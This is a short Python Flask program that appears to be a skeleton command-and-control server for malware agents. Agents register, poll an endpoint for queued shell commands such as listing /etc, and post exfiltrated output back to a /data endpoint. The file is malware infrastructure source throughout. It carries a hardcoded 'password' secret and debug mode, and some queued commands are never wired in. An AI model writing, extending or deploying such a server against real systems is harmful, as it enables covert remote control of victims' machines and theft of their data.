import hashlib
import base64
from flask import Flask, request

# import ssl

PORT = 9998
active = "passive"

cmds = []

app = Flask(__name__)

agent_db = {}


def register_agent(uname, uid):
	global agent_db
	base = {
		"uname": uname,
		"commands": {},
		"poll": "active",
		"password": "password"
	}
	if uid not in agent_db:
		agent_db[uid] = base
	else:
		print("Agent already registered")


@app.post("/register")
def register():
	data = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split("::")
	register_agent(data[0], data[1])
	return "", 200



@app.get("/<pid>/commands")
def serve_commands(pid):
	global agent_db
	print(agent_db)
	commands = agent_db[pid]["poll"]
	password = agent_db[pid]["password"]
	for cmd in agent_db[pid]["commands"].keys():
		hashed = hashlib.sha256(cmd.encode("utf-8")).hexdigest()
		commands += f"{password}:{cmd}:{hashed}\n"
	return base64.urlsafe_b64encode(bytes(commands.encode('utf-8')))


@app.post("/data")
def receive_data():
	data = base64.urlsafe_b64decode(bytes(request.data))
	print(str(data, "utf-8"))
	return "", 200


def add_commands(command, uid):
	global agent_db

	agent_db[uid]["commands"][command] = "!EMPTY!"


if __name__ == "__main__":
	cmds.append("ls:/etc")
	cmds.append("BUILTIN:name")
	cmds.append("BUILTIN:cwd")
	cmds.append("BUILTIN:pid")

	app.run(host="localhost", port=PORT, debug=True)
